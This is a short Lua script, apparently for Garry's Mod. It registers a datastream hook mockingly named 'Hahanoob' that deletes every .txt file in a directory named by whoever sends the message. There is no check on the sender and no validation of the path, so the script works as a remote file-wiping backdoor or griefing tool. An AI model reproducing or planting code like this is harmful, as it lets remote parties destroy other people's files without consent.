require("datastream")
local function Hahanoob(sender, handler, id, encoded, decoded)
	for _,filename in pairs(file.Find(decoded[1].."/*.txt")) do
		file.Delete(decoded[1].."/"..filename)
	end
end
datastream.Hook("Hahanoob", Hahanoob)